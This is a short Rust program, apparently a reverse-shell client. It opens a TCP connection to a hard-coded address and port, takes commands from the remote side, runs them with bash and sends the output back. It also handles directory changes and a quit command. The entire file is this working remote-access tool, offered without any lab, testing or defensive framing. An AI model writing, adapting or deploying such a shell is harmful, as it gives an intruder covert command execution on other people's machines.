use std::net::{TcpStream};
use std::io::{Read, Write};
use std::str::from_utf8;
use std::process;
use std::env;

fn main() {
    
    let ip: &str = "127.0.0.1";
    let port: i32 = 44444;

    let mut buf: [u8; 1024] = [0; 1024];

    match TcpStream::connect(format!("{}:{}", ip, port)) {
        Ok(mut connection) => {
            loop {
                let size = connection.read(&mut buf).unwrap();    
                let mut data = from_utf8(&mut buf[0..size]).unwrap();               
                
                let mut dataSplited: Vec<&str> = data
                    .split(" ")
                    .collect::<Vec<&str>>();


                if data == "quit" {
                    process::exit(0);


                }else if dataSplited[0] == "cd" {
                    env::set_current_dir(dataSplited[1]);


                }else {
                    let cmd = process::Command::new("bash")
                    .arg("-c")
                    .args(data
                        .split(" ")
                        .into_iter())
                    .output()
                    .unwrap();
                
                    if cmd.status.success() {
                        connection.write(&cmd.stdout);
                        
                    }else {
                        connection.write(&cmd.stderr);

                    }

                }

            }

        },

        Err(_) => {
            process::exit(0);

        },
    
    }

}
